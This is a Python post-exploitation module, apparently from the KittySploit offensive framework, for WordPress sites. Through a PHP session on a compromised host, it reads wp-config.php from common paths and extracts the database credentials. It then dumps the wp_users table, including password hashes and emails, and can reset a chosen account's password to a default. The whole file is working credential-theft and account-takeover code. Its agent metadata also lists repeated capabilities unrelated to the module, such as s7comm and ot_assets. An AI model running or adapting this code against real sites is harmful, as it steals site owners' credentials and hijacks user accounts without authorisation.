#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *


class Module(Post):
    __info__ = {
        "name": "WordPress DB User Takeover",
        "description": (
            "Extracts WordPress DB credentials from wp-config.php through a PHP session, dumps "
            "wp_users, and optionally resets one user's password."
        ),
        "author": "KittySploit Team",
        "session_type": SessionType.PHP,
        "arch": Arch.PHP,
        "tags": ["wordpress", "mysql", "post", "credential-access", "takeover"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'account_modification'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    wp_config_path = OptString("wp-config.php", "Path to wp-config.php; common fallbacks are tried", False)
    table_prefix = OptString("", "WordPress table prefix; empty extracts from wp-config.php or uses wp_", False)
    action = OptChoice("dump", "Action to perform", False, choices=["dump", "reset"])
    username = OptString("admin", "User login to reset when action=reset", False)
    new_password = OptString("Password123!", "New password when action=reset", False)

    @staticmethod
    def _escape_php(value: str) -> str:
        return (value or "").replace("\\", "\\\\").replace("'", "\\'")

    def _candidate_paths(self):
        first = str(self.wp_config_path or "wp-config.php").strip() or "wp-config.php"
        paths = [first, "wp-config.php", "../wp-config.php", "../../wp-config.php", "/bitnami/wordpress/wp-config.php", "/var/www/html/wp-config.php", "/var/www/wp-config.php"]
        deduped = []
        for path in paths:
            if path not in deduped:
                deduped.append(path)
        return deduped

    def _extract_config(self):
        paths = ",".join("'" + self._escape_php(p) + "'" for p in self._candidate_paths())
        php = f"""
$paths = array({paths});
foreach ($paths as $path) {{
    if (file_exists($path)) {{
        echo "PATH:" . $path . "\\n";
        echo file_get_contents($path);
        return;
    }}
}}
echo "ERROR:wp_config_not_found";
"""
        content = self.cmd_execute(php)
        if not content or "ERROR:wp_config_not_found" in content:
            raise ProcedureError(FailureType.NotFound, "wp-config.php not found")
        return content

    @staticmethod
    def _define(content: str, name: str) -> str:
        match = re.search(rf"define\s*\(\s*['\"]{re.escape(name)}['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)", content, re.I)
        return match.group(1) if match else ""

    @staticmethod
    def _prefix(content: str) -> str:
        match = re.search(r"\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;", content, re.I)
        return match.group(1) if match else "wp_"

    def _query_php(self, cfg: dict, query: str) -> str:
        host = self._escape_php(cfg["host"])
        user = self._escape_php(cfg["user"])
        password = self._escape_php(cfg["password"])
        db = self._escape_php(cfg["db"])
        query = self._escape_php(query)
        return f"""
$host = '{host}';
$user = '{user}';
$pass = '{password}';
$db = '{db}';
$query = '{query}';
$mysqli = @new mysqli($host, $user, $pass, $db);
if ($mysqli->connect_error) {{
    echo "ERROR:connect:" . $mysqli->connect_error;
    return;
}}
$result = @$mysqli->query($query);
if ($result === false) {{
    echo "ERROR:query:" . $mysqli->error;
    $mysqli->close();
    return;
}}
if ($result === true) {{
    echo "OK";
    $mysqli->close();
    return;
}}
$rows = array();
while ($row = $result->fetch_assoc()) {{
    $rows[] = $row;
}}
echo json_encode($rows);
$result->free();
$mysqli->close();
"""

    def run(self):
        config = self._extract_config()
        cfg = {
            "db": self._define(config, "DB_NAME"),
            "user": self._define(config, "DB_USER"),
            "password": self._define(config, "DB_PASSWORD"),
            "host": self._define(config, "DB_HOST") or "localhost",
        }
        if not cfg["db"] or not cfg["user"]:
            raise ProcedureError(FailureType.NotAccess, "Could not extract DB_NAME/DB_USER from wp-config.php")
        prefix = str(self.table_prefix or "").strip() or self._prefix(config)
        print_success(f"WordPress DB credentials extracted for {cfg['user']}@{cfg['host']}/{cfg['db']} (password redacted)")

        if str(self.action or "dump") == "reset":
            user = self._escape_php(str(self.username or "admin"))
            new_password = self._escape_php(str(self.new_password or "Password123!"))
            query = f"UPDATE `{prefix}users` SET user_pass=MD5('{new_password}') WHERE user_login='{user}'"
            output = self.cmd_execute(self._query_php(cfg, query))
            if output.strip() == "OK":
                print_success(f"Password reset query executed for WordPress user {self.username!r}")
                return True
            print_error(output)
            return False

        query = f"SELECT ID,user_login,user_email,user_pass,user_registered FROM `{prefix}users`"
        output = self.cmd_execute(self._query_php(cfg, query))
        if output:
            print_info(output[:10000])
            return not output.startswith("ERROR:")
        print_warning("No output from wp_users query")
        return False

